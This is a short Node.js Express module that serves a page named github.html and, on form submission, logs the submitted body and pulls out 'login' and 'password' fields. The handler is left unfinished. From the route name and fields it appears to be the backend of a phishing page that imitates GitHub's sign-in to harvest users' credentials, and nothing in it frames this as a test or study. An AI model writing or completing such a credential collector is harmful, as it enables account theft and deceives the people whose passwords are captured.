module.exports = function(app){
	const bodyParser = require("body-parser");
	const urlencodedParser = bodyParser.urlencoded({extended: false});
	app.get("/github",function(request,response){
		response.sendFile(__dirname+"/github.html");
	});

	app.post("/github", urlencodedParser, function (request, response) {
	    if(!request.body) return response.sendStatus(400);
	    console.log(request.body);
	    var login = `${request.body.login}`;
	    var password=`${request.body.password}`;
	    
	});
}